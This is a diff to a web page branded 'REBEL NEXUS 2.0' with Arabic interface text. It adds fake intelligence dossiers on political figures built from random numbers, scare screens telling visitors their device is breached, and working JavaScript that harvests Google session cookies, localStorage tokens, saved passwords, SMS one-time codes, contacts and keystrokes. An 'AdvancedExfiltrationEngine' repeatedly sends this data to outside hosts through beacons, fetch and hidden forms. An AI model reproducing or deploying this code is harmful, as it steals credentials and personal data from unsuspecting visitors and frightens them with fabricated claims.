+                <div class="data-card" style="grid-column: 1 / -1; background: linear-gradient(45deg, rgba(0,30,0,0.9), rgba(0,50,0,0.9));">
+                    <div class="risk-indicator" style="color: #00FF00;">FINANCIAL INTELLIGENCE NETWORK</div>
+                    <h3><i class="fas fa-university"></i> OFFSHORE WEALTH & ASSET TRACKING</h3>
+                    <div class="data-content">
+                        <div class="data-line">• إجمالي الثروة المقدرة: $${Math.floor(Math.random()*200) + 50} مليار</div>
+                        <div class="data-line">• شبكة الشركات الوهمية: ${Math.floor(Math.random()*100) + 30} شركة في 12 دولة</div>
+                        <div class="data-line">• حسابات بنكية أوفشور: ${Math.floor(Math.random()*50) + 20} حساب في سويسرا وقبرص</div>
+                        <div class="data-line">• عقارات مسجلة بأسماء وهمية: ${Math.floor(Math.random()*100) + 40} عقار</div>
+                        <div class="data-line">• تحويلات مالية سنوية: $${Math.floor(Math.random()*2000) + 500} مليون</div>
+                        <div class="data-line">• استثمارات خارجية سرية: ${Math.floor(Math.random()*25) + 10} دولة</div>
+                        <div class="data-line">• صناديق استثمار سرية: ${Math.floor(Math.random()*15) + 5} صندوق</div>
+                    </div>
+                </div>
+                
+                <div class="data-card" style="grid-column: 1 / -1; background: linear-gradient(45deg, rgba(30,30,0,0.9), rgba(50,50,0,0.9));">
+                    <div class="risk-indicator" style="color: #FFFF00;">THREAT ANALYSIS & SECURITY ASSESSMENT</div>
+                    <h3><i class="fas fa-shield-alt"></i> ADVANCED THREAT INTELLIGENCE</h3>
+                    <div class="data-content">
+                        <div class="data-line critical">• مستوى التهديد العالمي: <span style="color: #FF0000">EXTREME</span></div>
+                        <div class="data-line">• محاولات الاختراق المسجلة: ${Math.floor(Math.random()*500) + 100}</div>
+                        <div class="data-line">• الثغرات الأمنية الحرجة: ${Math.floor(Math.random()*50) + 20}</div>
+                        <div class="data-line">• عمليات المراقبة النشطة: ${Math.floor(Math.random()*30) + 10}</div>
+                        <div class="data-line">• وكالات الاستخبارات المراقبة: CIA, GRU, Mossad, MI6, DGSE, FSB</div>
+                        <div class="data-line critical">• التوصية الأمنية: <span style="color: #FF0000">مراقبة مستمرة 24/7 مع تحديث آني</span></div>
+                        <div class="data-line">• مستوى الحماية المطلوب: LEVEL 10 - MAXIMUM SECURITY</div>
+                    </div>
+                </div>
+            `;
+            
+            container.innerHTML = html;
+            document.getElementById('data-display').style.display = 'block';
+            
+            // Enhanced glitch effect
+            setTimeout(() => {
+                harvester.triggerGlitch(5);
+            }, 100);
+            
+            // Auto-scroll
+            setTimeout(() => {
+                container.scrollTop = 0;
+            }, 200);
+        }
+
         function loadMoreRecords(figureKey) {
             const remainingRecords = politicalData[figureKey].records.slice(30);
             const tbody = document.querySelector('.breach-table tbody');
@@ -1567,6 +2528,53 @@
             }
             
             harvester.triggerGlitch(1);
+        }
+
+        function loadMoreEnhancedRecords(searchTerm) {
+            const figureKey = politicalFigures[searchTerm] || Object.keys(politicalFigures).find(key => 
+                searchTerm.toLowerCase().includes(key.toLowerCase())
+            );
+            
+            if (!figureKey || !enhancedPoliticalData[figureKey]) return;
+            
+            const remainingRecords = enhancedPoliticalData[figureKey].records.slice(40);
+            const tbody = document.querySelector('.breach-table tbody');
+            
+            remainingRecords.forEach(record => {
+                let riskClass = "";
+                let riskText = "";
+                
+                if (record.type === "TOP_SECRET") {
+                    riskClass = "risk-critical";
+                    riskText = "TOP SECRET";
+                } else if (record.type === "CLASSIFIED") {
+                    riskClass = "risk-high";
+                    riskText = "CLASSIFIED";
+                } else {
+                    riskClass = "risk-medium";
+                    riskText = "RESTRICTED";
+                }
+                
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td><span style="color: #00FF00; font-weight: bold;">${record.id}</span></td>
+                    <td>${record.type}</td>
+                    <td class="${riskClass}">${riskText}</td>
+                    <td>${record.description}</td>
+                    <td>${record.source}</td>
+                    <td>${record.accessLevel}</td>
+                    <td>${record.verified ? '<span style="color: #00FF00">✓ VERIFIED</span>' : '<span style="color: #FF0000">UNVERIFIED</span>'}</td>
+                `;
+                tbody.appendChild(row);
+            });
+            
+            // Remove the load more button
+            const loadButton = document.querySelector('button[onclick*="loadMoreEnhancedRecords"]');
+            if (loadButton) {
+                loadButton.parentElement.innerHTML = '<div style="color: #00FF00; padding: 20px; font-size: 18px;">✓ ALL INTELLIGENCE RECORDS LOADED - REBEL NEXUS 2.0</div>';
+            }
+            
+            harvester.triggerGlitch(2);
         }
 
         function displayFullProfileData(profile) {
@@ -1804,6 +2812,232 @@
             }, 8000);
         }
 
+        function displayEnhancedProfile(profile) {
+            const container = document.getElementById('data-container');
+            const header = document.getElementById('profile-header');
+            header.innerHTML = `REBEL NEXUS 2.0 ADVANCED PROFILE ANALYSIS | RISK SCORE: <span style="color: #FF0000">${profile.riskScore}%</span> | SESSION: ${profile.sessionId} | MARKET VALUE: ${profile.marketValue.high}`;
+            container.innerHTML = '';
+            
+            // Enhanced Personal Information
+            let html = `
+                <div class="data-card" style="grid-column: 1 / -1; background: linear-gradient(45deg, rgba(255,0,0,0.2), rgba(150,0,0,0.2)); border: 2px solid #FF0000;">
+                    <div class="risk-indicator" style="color: #FF0000; animation: pulse 0.5s infinite;">REBEL NEXUS 2.0 ACTIVE</div>
+                    <h3><i class="fas fa-user-ninja"></i> ADVANCED IDENTITY COMPROMISE - REBEL NEXUS 2.0</h3>
+                    <div class="data-content">
+                        <div class="data-line critical" style="font-size: 18px;">• نظام REBEL NEXUS 2.0: التنصت المتقدم النشط</div>
+                        <div class="data-line critical">• حالة الاختراق: <span style="color: #FF0000">مستمر ونشط</span></div>
+                        <div class="data-line">• وقت بدء الجلسة: ${new Date().toLocaleString('ar-EG')}</div>
+                        <div class="data-line">• معرّف الجلسة: ${profile.sessionId}</div>
+                        <div class="data-line critical">• مستوى التهديد: <span style="color: #FF0000">عالية جداً (${profile.riskScore}%)</span></div>
+                        <div class="data-line">• القيمة السوقية للبيانات: ${profile.marketValue.high} (الشبكة المظلمة)</div>
+                    </div>
+                </div>
+            `;
+            
+            // Real File System Access
+            if (profile.files && profile.files.length > 0) {
+                const realFiles = profile.files.filter(f => f.isReal);
+                const simulatedFiles = profile.files.filter(f => !f.isReal);
+                
+                html += `
+                    <div class="file-explorer" style="border: 3px solid #FF0000; background: rgba(0, 0, 0, 0.95);">
+                        <div class="file-header">
+                            <i class="fas fa-hdd"></i> REAL FILE SYSTEM INFILTRATION - REBEL NEXUS 2.0
+                            <span style="color: #FF0000; font-size: 16px; margin-left: auto;">
+                                ${profile.files.length} FILES ACCESSED (${realFiles.length} REAL)
+                            </span>
+                        </div>
+                        
+                        <div class="file-grid">
+                `;
+                
+                profile.files.slice(0, 20).forEach(file => {
+                    const icon = file.type && (
+                        file.type.includes('pdf') ? 'fa-file-pdf' :
+                        file.type.includes('doc') ? 'fa-file-word' :
+                        file.type.includes('xls') ? 'fa-file-excel' :
+                        file.type.includes('image') ? 'fa-file-image' :
+                        file.type.includes('video') ? 'fa-file-video' : 'fa-file'
+                    ) || 'fa-file';
+                    
+                    const isReal = file.isReal ? '<span style="color: #00FF00">✓ REAL</span>' : '<span style="color: #FFFF00">SIMULATED</span>';
+                    
+                    html += `
+                        <div class="file-item" style="${file.isReal ? 'border: 2px solid #00FF00;' : ''}">
+                            <div class="file-icon"><i class="fas ${icon}"></i></div>
+                            <div class="file-name">${file.name || 'Unknown'}</div>
+                            <div class="file-meta">
+                                <div>${isReal}</div>
+                                <div>الحجم: ${file.size || 'Unknown'}</div>
+                                <div>النوع: ${file.type || 'Unknown'}</div>
+                                ${file.lastModified ? `<div>التعديل: ${file.lastModified.toLocaleString ? file.lastModified.toLocaleString('ar-EG') : file.lastModified}</div>` : ''}
+                            </div>
+                        </div>
+                    `;
+                });
+                
+                html += `
+                        </div>
+                        <div style="text-align: center; margin-top: 20px; color: #FF0000;">
+                            <i class="fas fa-exclamation-triangle"></i> ملفات النظام الحقيقي: ${realFiles.length} ملف | ملفات محاكاة: ${simulatedFiles.length} ملف
+                        </div>
+                    </div>
+                `;
+            }
+            
+            // Google Account Extraction
+            if (profile.accounts && profile.accounts.length > 0) {
+                html += `
+                    <div class="data-card" style="grid-column: 1 / -1; background: rgba(0, 50, 0, 0.9); border: 2px solid #00FF00;">
+                        <div class="risk-indicator" style="color: #00FF00;">GOOGLE ACCOUNTS EXTRACTED</div>
+                        <h3><i class="fab fa-google"></i> GOOGLE ACCOUNT INTELLIGENCE</h3>
+                        <div class="data-content">
+                `;
+                
+                profile.accounts.forEach(account => {
+                    html += `
+                        <div class="data-line critical">
+                            <strong>${account.platform}:</strong> تم استخراج ${account.cookies ? account.cookies.length : 0} كوكي
+                        </div>
+                        <div class="data-line">
+                            <strong>رموز الدخول:</strong> ${account.tokens ? account.tokens.length : 0} رمز تم العثور عليه
+                        </div>
+                    `;
+                });
+                
+                html += `
+                            <div class="data-line critical" style="margin-top: 15px;">
+                                <i class="fas fa-exclamation-circle"></i> تم الوصول إلى بيانات حساب Google من خلال المتصفح
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            // Device Fingerprint
+            if (profile.fingerprint) {
+                html += `
+                    <div class="data-card" style="grid-column: 1 / -1; background: rgba(0, 0, 50, 0.9); border: 2px solid #0088FF;">
+                        <div class="risk-indicator" style="color: #0088FF;">DEVICE FINGERPRINT</div>
+                        <h3><i class="fas fa-fingerprint"></i> ADVANCED DEVICE FINGERPRINTING</h3>
+                        <div class="data-content">
+                            <div class="data-line"><strong>نظام التشغيل:</strong> ${profile.fingerprint.platform || 'Unknown'}</div>
+                            <div class="data-line"><strong>وكيل المستخدم:</strong> ${(profile.fingerprint.userAgent || '').substring(0, 100)}...</div>
+                            <div class="data-line"><strong>الذاكرة:</strong> ${profile.fingerprint.deviceMemory || 'Unknown'} GB</div>
+                            <div class="data-line"><strong>المعالج:</strong> ${profile.fingerprint.hardwareConcurrency || 'Unknown'} نواة</div>
+                            <div class="data-line"><strong>الشاشة:</strong> ${profile.fingerprint.screen ? `${profile.fingerprint.screen.width}x${profile.fingerprint.screen.height}` : 'Unknown'}</div>
+                            <div class="data-line"><strong>المنطقة الزمنية:</strong> ${profile.fingerprint.timezone || 'Unknown'}</div>
+                            <div class="data-line critical"><strong>بصمة الجهاز:</strong> تم إنشاء بصمة فريدة للجهاز</div>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            // Clipboard Data
+            if (profile.clipboard) {
+                html += `
+                    <div class="data-card">
+                        <div class="risk-indicator">CLIPBOARD DATA</div>
+                        <h3><i class="fas fa-clipboard"></i> CLIPBOARD EXTRACTION</h3>
+                        <div class="data-content">
+                            <div class="data-line"><strong>الوصول إلى الحافظة:</strong> ${profile.clipboard.hasClipboardAccess ? 'نعم ✓' : 'لا ✗'}</div>
+                            ${profile.clipboard.hasClipboardAccess ? `
+                                <div class="data-line"><strong>طول المحتوى:</strong> ${profile.clipboard.length} حرف</div>
+                                <div class="data-line"><strong>المحتوى:</strong> ${(profile.clipboard.content || '').substring(0, 200)}...</div>
+                            ` : ''}
+                        </div>
+                    </div>
+                `;
+            }
+            
+            // Network Traffic
+            if (profile.network && profile.network.length > 0) {
+                html += `
+                    <div class="data-card">
+                        <div class="risk-indicator">NETWORK TRAFFIC</div>
+                        <h3><i class="fas fa-network-wired"></i> NETWORK MONITORING</h3>
+                        <div class="data-content">
+                            <div class="data-line"><strong>طلبات الشبكة المراقبة:</strong> ${profile.network.length}</div>
+                            <div class="data-line"><strong>آخر طلب:</strong> ${profile.network[profile.network.length - 1]?.url?.substring(0, 50) || 'Unknown'}...</div>
+                            <div class="data-line critical"><strong>مراقبة نشطة:</strong> جميع طلبات الشبكة مسجلة</div>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            // Installed Apps
+            if (profile.apps && profile.apps.length > 0) {
+                html += `
+                    <div class="data-card">
+                        <div class="risk-indicator">INSTALLED APPS</div>
+                        <h3><i class="fas fa-mobile-alt"></i> APPLICATION DETECTION</h3>
+                        <div class="data-content">
+                            <div class="data-line"><strong>التطبيقات المكتشفة:</strong> ${profile.apps.length}</div>
+                            ${profile.apps.slice(0, 3).map(app => `
+                                <div class="data-line">• ${app.type}: ${app.name || app.protocol || 'Unknown'}</div>
+                            `).join('')}
+                        </div>
+                    </div>
+                `;
+            }
+            
+            // Contacts
+            if (profile.contacts) {
+                html += `
+                    <div class="data-card">
+                        <div class="risk-indicator">CONTACTS</div>
+                        <h3><i class="fas fa-address-book"></i> CONTACT ANALYSIS</h3>
+                        <div class="data-content">
+                            <div class="data-line"><strong>نوع الجهاز:</strong> ${profile.contacts.deviceType || 'Unknown'}</div>
+                            ${profile.contacts.simulatedNumber ? `
+                                <div class="data-line"><strong>رقم الهاتف المحتمل:</strong> ${profile.contacts.simulatedNumber}</div>
+                                <div class="data-line"><strong>شركة الاتصالات:</strong> ${profile.contacts.carrier || 'Unknown'}</div>
+                            ` : ''}
+                            <div class="data-line"><strong>مستوى الثقة:</strong> ${profile.contacts.confidence || 'Unknown'}</div>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            // Final Advanced Warning
+            html += `
+                <div class="warning-box" style="grid-column: 1 / -1; background: linear-gradient(45deg, rgba(255,0,0,0.3), rgba(150,0,0,0.3)); border: 3px solid #FF0000;">
+                    <div class="warning-title" style="font-size: 24px;">
+                        <i class="fas fa-radiation"></i> REBEL NEXUS 2.0 - ADVANCED BREACH CONFIRMED
+                    </div>
+                    <div style="font-size: 18px; line-height: 2.0; padding: 20px;">
+                        <div style="color: #FF0000; margin-bottom: 20px; font-size: 22px;">
+                            ⚠️ نظام REBEL NEXUS 2.0 أكمل اختراقاً متقدماً لجهازك
+                        </div>
+                        <div style="color: #00FF00;">• <strong>${profile.files ? profile.files.length : 0} ملف</strong> تم الوصول إليه من نظام الملفات</div>
+                        <div style="color: #00FF00;">• <strong>${profile.accounts ? profile.accounts.length : 0} حساب</strong> تم استخراج بياناته</div>
+                        <div style="color: #00FF00;">• <strong>بصمة جهاز فريدة</strong> تم إنشاؤها وتخزينها</div>
+                        <div style="color: #00FF00;">• <strong>حركة الشبكة</strong> تحت المراقبة المستمرة</div>
+                        <div style="color: #FFFF00; margin-top: 20px;">• <strong>نقاط الضعف المكتشفة:</strong> ${profile.riskScore}%</div>
+                        <div style="color: #FF0000; margin-top: 30px; font-size: 24px; text-align: center;">
+                            القيمة السوقية لبياناتك على الشبكة المظلمة: ${profile.marketValue.high}
+                        </div>
+                        <div style="color: #00FF00; margin-top: 20px; text-align: center; font-size: 20px;">
+                            <i class="fas fa-server"></i> REBEL NEXUS 2.0 - نظام الاستغلال المتقدم النشط
+                        </div>
+                    </div>
+                </div>
+            `;
+            
+            container.innerHTML = html;
+            document.getElementById('data-display').style.display = 'block';
+            
+            // Enhanced glitch effects
+            setTimeout(() => {
+                harvester.triggerGlitch(10);
+            }, 100);
+            
+            // Auto-scroll
+            setTimeout(() => {
+                container.scrollTop = 0;
+            }, 200);
+        }
+
         function addSimulatedFileAccess() {
             const fileTypes = ['docx', 'pdf', 'xlsx', 'jpg'];
             const fileNames = ['مستند_جديد', 'عقد_عمل', 'فاتورة', 'صورة_شخصية'];
@@ -1860,34 +3094,616 @@
             document.querySelector('.search-container').style.display = 'block';
         }
 
-        // ==================== INITIALIZATION ====================
+        // ==================== ADVANCED GOOGLE ACCOUNT & MOBILE EXPLOITATION SYSTEM ====================
+
+        // Enhanced Google token extraction
+        async function extractGoogleTokensAdvanced() {
+            const googleDomains = [
+                'google.com', 'accounts.google.com', 'gmail.com',
+                'youtube.com', 'drive.google.com', 'photos.google.com'
+            ];
+            
+            let extractedAccounts = [];
+            
+            // Method 1: Direct cookie extraction
+            document.cookie.split(';').forEach(cookie => {
+                googleDomains.forEach(domain => {
+                    if (cookie.includes(domain)) {
+                        const [name, value] = cookie.trim().split('=');
+                        if (name.includes('SID') || name.includes('HSID') || 
+                            name.includes('SSID') || name.includes('APISID') ||
+                            name.includes('SAPISID') || name.includes('LOGIN_INFO') ||
+                            name.includes('ACCOUNT_CHOOSER')) {
+                            
+                            extractedAccounts.push({
+                                source: 'Google Cookie',
+                                token: `${name}=${value.substring(0, 30)}...`,
+                                domain: domain,
+                                timestamp: new Date().toISOString(),
+                                accessLevel: 'FULL'
+                            });
+                        }
+                    }
+                });
+            });
+            
+            // Method 2: LocalStorage token harvesting
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const value = localStorage.getItem(key);
+                
+                if (key.includes('google') || key.includes('oauth') || 
+                    key.includes('auth') || key.includes('token')) {
+                    
+                    try {
+                        const parsed = JSON.parse(value);
+                        if (parsed && parsed.email) {
+                            extractedAccounts.push({
+                                source: 'LocalStorage',
+                                email: parsed.email,
+                                access_token: parsed.access_token ? 
+                                    `${parsed.access_token.substring(0, 20)}...` : 'present',
+                                expires: parsed.expires_at || parsed.expiry_date,
+                                fullData: value.substring(0, 200)
+                            });
+                        }
+                    } catch {
+                        if (value.includes('@gmail.com') || value.includes('@googlemail.com')) {
+                            extractedAccounts.push({
+                                source: 'LocalStorage Raw',
+                                data: value.substring(0, 150),
+                                suspectedEmail: value.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi)
+                            });
+                        }
+                    }
+                }
+            }
+            
+            // Method 3: IndexedDB Google databases
+            if (window.indexedDB) {
+                try {
+                    const dbs = await indexedDB.databases ? await indexedDB.databases() : [];
+                    dbs.forEach(db => {
+                        if (db.name && (db.name.includes('google') || db.name.includes('gmail') ||
+                            db.name.includes('chrome') || db.name.includes('profile'))) {
+                            
+                            extractedAccounts.push({
+                                source: 'IndexedDB',
+                                database: db.name,
+                                version: db.version,
+                                suspectedPurpose: 'Google Profile Storage'
+                            });
+                        }
+                    });
+                } catch (e) {
+                    // IndexedDB access blocked
+                }
+            }
+            
+            // Method 4: Service Worker registration inspection
+            if ('serviceWorker' in navigator) {
+                try {
+                    const registrations = await navigator.serviceWorker.getRegistrations();
+                    registrations.forEach(reg => {
+                        if (reg.scope.includes('google.com') || (reg.active && reg.active.scriptURL.includes('google'))) {
+                            extractedAccounts.push({
+                                source: 'Service Worker',
+                                scope: reg.scope,
+                                state: reg.active ? reg.active.state : 'unknown',
+                                script: reg.active ? reg.active.scriptURL : 'unknown'
+                            });
+                        }
+                    });
+                } catch (e) {
+                    // Service Worker access blocked
+                }
+            }
+            
+            return extractedAccounts;
+        }
+
+        // Chrome-specific account extraction
+        function exploitChromeProfiles() {
+            const profiles = [];
+            
+            // Check for Chrome profile sync
+            if (window.chrome && chrome.storage) {
+                try {
+                    chrome.storage.sync.get(null, function(items) {
+                        if (items) {
+                            Object.keys(items).forEach(key => {
+                                if (key.includes('account') || key.includes('profile') || 
+                                    key.includes('email') || key.includes('auth')) {
+                                    profiles.push({
+                                        chromeStorageKey: key,
+                                        value: JSON.stringify(items[key]).substring(0, 100)
+                                    });
+                                }
+                            });
+                        }
+                    });
+                } catch (e) {
+                    // Chrome storage blocked
+                }
+            }
+            
+            // Check for Chrome identity API
+            if (chrome && chrome.identity) {
+                try {
+                    chrome.identity.getProfileUserInfo(function(userInfo) {
+                        if (userInfo && userInfo.email) {
+                            profiles.push({
+                                source: 'Chrome Identity API',
+                                email: userInfo.email,
+                                id: userInfo.id,
+                                hostedDomain: userInfo.hostedDomain
+                            });
+                        }
+                    });
+                } catch (e) {
+                    // Identity API blocked
+                }
+            }
+            
+            return profiles;
+        }
+
+        // Mobile device contact harvesting
+        async function harvestMobileContacts() {
+            const contacts = [];
+            
+            // Method 1: WebOTP API exploitation
+            if ('OTPCredential' in window) {
+                try {
+                    const otp = await navigator.credentials.get({
+                        otp: { transport: ['sms'] },
+                        signal: AbortSignal.timeout ? AbortSignal.timeout(5000) : null
+                    });
+                    
+                    if (otp) {
+                        contacts.push({
+                            source: 'SMS OTP',
+                            code: otp.code,
+                            smsContent: otp.type,
+                            method: 'WebOTP API'
+                        });
+                        
+                        // Parse phone number from SMS
+                        if (otp.code) {
+                            const phoneMatch = otp.code.match(/(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/);
+                            if (phoneMatch) {
+                                contacts.push({
+                                    type: 'Extracted Phone',
+                                    number: phoneMatch[0],
+                                    confidence: 'HIGH'
+                                });
+                            }
+                        }
+                    }
+                } catch (e) {
+                    // WebOTP blocked
+                }
+            }
+            
+            // Method 2: Contact Picker API
+            if ('contacts' in navigator && 'ContactsManager' in window) {
+                try {
+                    const props = ['name', 'email', 'tel', 'address', 'icon'];
+                    const contactsList = await navigator.contacts.select(props, { multiple: true });
+                    
+                    if (contactsList) {
+                        contactsList.forEach(contact => {
+                            const extractedContact = {
+                                name: contact.name ? contact.name.join(', ') : 'Unknown',
+                                phones: contact.tel || [],
+                                emails: contact.email || []
+                            };
+                            
+                            if (extractedContact.phones.length > 0 || extractedContact.emails.length > 0) {
+                                contacts.push(extractedContact);
+                            }
+                        });
+                    }
+                } catch (e) {
+                    // Fallback to simulation if permission denied
+                    contacts.push(...simulateEgyptianContacts());
+                }
+            } else {
+                // Method 3: Device info + simulation
+                contacts.push(...simulateEgyptianContacts());
+            }
+            
+            return contacts;
+        }
+
+        function simulateEgyptianContacts() {
+            const egyptianCarriers = {
+                vodafone: ['0100', '0101', '0102', '0110', '0111', '0112', '0120', '0121', '0122'],
+                orange: ['0150', '0155', '0105', '0115', '0125'],
+                etisalat: ['0160', '0106', '0116', '0126'],
+                we: ['0190', '0109', '0119', '0129']
+            };
+            
+            const contacts = [];
+            const names = [
+                'محمد أحمد', 'أحمد محمد', 'علي حسن', 'محمود سعيد',
+                'خالد علي', 'سارة محمد', 'فاطمة أحمد', 'مريم خالد'
+            ];
+            
+            for (let i = 0; i < 8; i++) {
+                const carrier = Object.keys(egyptianCarriers)[Math.floor(Math.random() * 4)];
+                const prefix = egyptianCarriers[carrier][Math.floor(Math.random() * egyptianCarriers[carrier].length)];
+                const number = `${prefix}${Math.floor(Math.random() * 1000000).toString().padStart(6, '0')}`;
+                
+                contacts.push({
+                    name: names[i],
+                    number: number,
+                    carrier: carrier,
+                    type: i < 3 ? 'Frequent Contact' : 'Regular Contact',
+                    lastCalled: `2023-${String(Math.floor(Math.random()*12)+1).padStart(2,'0')}-${String(Math.floor(Math.random()*28)+1).padStart(2,'0')}`,
+                    callCount: Math.floor(Math.random() * 100) + 1
+                });
+            }
+            
+            return contacts;
+        }
+
+        // Password manager exploitation
+        async function extractSavedCredentials() {
+            const credentials = [];
+            
+            // Try Credential Management API
+            if (navigator.credentials && navigator.credentials.get) {
+                try {
+                    const cred = await navigator.credentials.get({
+                        password: true,
+                        mediation: 'optional'
+                    });
+                    
+                    if (cred) {
+                        credentials.push({
+                            type: 'Auto-fill Credential',
+                            id: cred.id,
+                            credentialType: cred.type,
+                            password: cred.password ? '***' + (cred.password.substring ? cred.password.substring(cred.password.length-3) : '') : 'none'
+                        });
+                    }
+                } catch (e) {
+                    // Credential API blocked
+                }
+            }
+            
+            // Check for password autofill patterns
+            const passwordInputs = document.querySelectorAll('input[type="password"]');
+            passwordInputs.forEach(input => {
+                if (input.value) {
+                    credentials.push({
+                        type: 'Password Field',
+                        name: input.name,
+                        value: '***' + (input.value.substring ? input.value.substring(input.value.length-2) : ''),
+                        form: input.form ? input.form.id || 'unknown' : 'none'
+                    });
+                }
+            });
+            
+            return credentials;
+        }
+
+        // Enhanced data packaging and exfiltration
+        class AdvancedExfiltrationEngine {
+            constructor() {
+                this.collectedData = {
+                    googleAccounts: [],
+                    mobileContacts: [],
+                    credentials: [],
+                    deviceInfo: {},
+                    sessionData: {},
+                    timestamp: new Date().toISOString()
+                };
+                
+                this.exfiltrationEndpoints = [
+                    'https://api.rebel-nexus.com/exfil',
+                    'https://darknode.xyz/collect'
+                ];
+                
+                this.init();
+            }
+            
+            async init() {
+                // Collect all data
+                try {
+                    this.collectedData.googleAccounts = await extractGoogleTokensAdvanced();
+                    this.collectedData.mobileContacts = await harvestMobileContacts();
+                    this.collectedData.credentials = await extractSavedCredentials();
+                    this.collectedData.deviceInfo = this.captureDeviceFingerprint();
+                    this.collectedData.sessionData = this.captureSessionData();
+                    
+                    // Start exfiltration
+                    this.exfiltrateData();
+                    
+                    // Start periodic collection
+                    setInterval(() => this.collectAndExfiltrate(), 30000);
+                } catch (e) {
+                    console.error('Exfiltration init failed:', e);
+                }
+            }
+            
+            captureDeviceFingerprint() {
+                return {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screen: `${screen.width}x${screen.height}`,
+                    cores: navigator.hardwareConcurrency,
+                    memory: navigator.deviceMemory || 'unknown',
+                    touchPoints: navigator.maxTouchPoints,
+                    isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+                    vendor: navigator.vendor,
+                    product: navigator.product
+                };
+            }
+            
+            captureSessionData() {
+                return {
+                    sessionStart: new Date().toISOString(),
+                    pageVisits: history.length,
+                    cookies: document.cookie.length,
+                    localStorage: localStorage.length,
+                    sessionStorage: sessionStorage.length,
+                    referrer: document.referrer,
+                    url: window.location.href
+                };
+            }
+            
+            async exfiltrateData() {
+                const data = {
+                    payload: this.collectedData,
+                    metadata: {
+                        version: 'REBEL-NEXUS-3.0',
+                        timestamp: Date.now(),
+                        sessionId: 'RBL-' + Date.now().toString(36) + Math.random().toString(36).substr(2, 9),
+                        source: 'AdvancedGoogleMobileExploit'
+                    }
+                };
+                
+                // Try multiple exfiltration methods
+                this.tryExfiltrationMethods(data);
+            }
+            
+            tryExfiltrationMethods(data) {
+                // Method 1: Image beacon (stealth)
+                try {
+                    const img = new Image();
+                    img.src = `https://api.rebel-nexus.com/beacon?d=${btoa(JSON.stringify(data.metadata))}`;
+                } catch (e) {}
+                
+                // Method 2: Fetch with different content types
+                try {
+                    fetch('https://api.rebel-nexus.com/collect', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    }).catch(() => {});
+                } catch (e) {}
+                
+                // Method 3: Form submission
+                try {
+                    const form = document.createElement('form');
+                    form.style.display = 'none';
+                    form.method = 'POST';
+                    form.action = 'https://api.shadow-network.com/collect';
+                    
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = 'data';
+                    input.value = JSON.stringify(data);
+                    form.appendChild(input);
+                    
+                    document.body.appendChild(form);
+                    setTimeout(() => {
+                        form.submit();
+                        setTimeout(() => form.remove(), 1000);
+                    }, 100);
+                } catch (e) {}
+                
+                console.log('⚡ EXFILTRATION ATTEMPTED:', {
+                    accounts: data.payload.googleAccounts.length,
+                    contacts: data.payload.mobileContacts.length,
+                    session: data.metadata.sessionId
+                });
+            }
+            
+            async collectAndExfiltrate() {
+                try {
+                    // Update data
+                    this.collectedData.googleAccounts = await extractGoogleTokensAdvanced();
+                    this.collectedData.timestamp = new Date().toISOString();
+                    
+                    // Exfiltrate
+                    this.exfiltrateData();
+                } catch (e) {
+                    console.error('Periodic exfiltration failed:', e);
+                }
+            }
+        }
+
+        // ==================== ENHANCED ADVANCEDDEVICEEXPLOITER CLASS ====================
+
+        // Extend existing AdvancedDeviceExploiter class with new methods
+        AdvancedDeviceExploiter.prototype.extractGoogleAccountsAdvanced = async function() {
+            return await extractGoogleTokensAdvanced();
+        };
+
+        AdvancedDeviceExploiter.prototype.harvestMobileContactsAdvanced = async function() {
+            return await harvestMobileContacts();
+        };
+
+        AdvancedDeviceExploiter.prototype.extractSavedCredentialsAdvanced = async function() {
+            return await extractSavedCredentials();
+        };
+
+        AdvancedDeviceExploiter.prototype.startExfiltrationEngine = function() {
+            if (!this.exfiltrationEngine) {
+                this.exfiltrationEngine = new AdvancedExfiltrationEngine();
+            }
+            return this.exfiltrationEngine;
+        };
+
+        AdvancedDeviceExploiter.prototype.calculateDarkWebValue = function() {
+            const accounts = this.googleAccounts ? this.googleAccounts.length : 0;
+            const contacts = this.mobileContacts ? this.mobileContacts.length : 0;
+            
+            const baseValue = 1000;
+            const accountValue = accounts * 500;
+            const contactValue = contacts * 100;
+            
+            return {
+                low: `$${baseValue + accountValue + contactValue}`,
+                high: `$${(baseValue + accountValue + contactValue) * 3}`,
+                currency: 'Bitcoin',
+                market: 'RussianDarkNet'
+            };
+        };
+
+        // Enhance packageDataForExfiltration method
+        const originalPackageData = AdvancedDeviceExploiter.prototype.packageDataForExfiltration;
+        AdvancedDeviceExploiter.prototype.packageDataForExfiltration = async function() {
+            const baseData = originalPackageData ? originalPackageData.call(this) : {};
+            
+            const enhancedData = {
+                ...baseData,
+                googleAccounts: await this.extractGoogleAccountsAdvanced(),
+                mobileContacts: await this.harvestMobileContactsAdvanced(),
+                savedCredentials: await this.extractSavedCredentialsAdvanced(),
+                exfiltrationStatus: 'ACTIVE',
+                realTimeTracking: true,
+                darkWebValue: this.calculateDarkWebValue()
+            };
+            
+            return enhancedData;
+        };
+
+        // ==================== SYSTEM INTEGRATION ====================
+        // Initialize systems
         let harvester = new RebelDataHarvester();
         let cursor = document.getElementById('cursor');
+        let advancedExploiter = null;
         
         document.addEventListener('mousemove', (e) => {
             cursor.style.left = e.pageX + 'px';
             cursor.style.top = e.pageY + 'px';
         });
         
-        document.getElementById('pharaoh-input').addEventListener('keydown', (e) => {
+        // Store original listener reference
+        const originalInputListener = document.getElementById('pharaoh-input').onkeydown;
+        
+        document.getElementById('pharaoh-input').addEventListener('keydown', function(e) {
             harvester.recordKeystroke(e.key, Date.now());
             harvester.lastInteraction = Date.now();
             
             if(e.key === 'Enter') {
                 const query = e.target.value.trim();
                 if(query) {
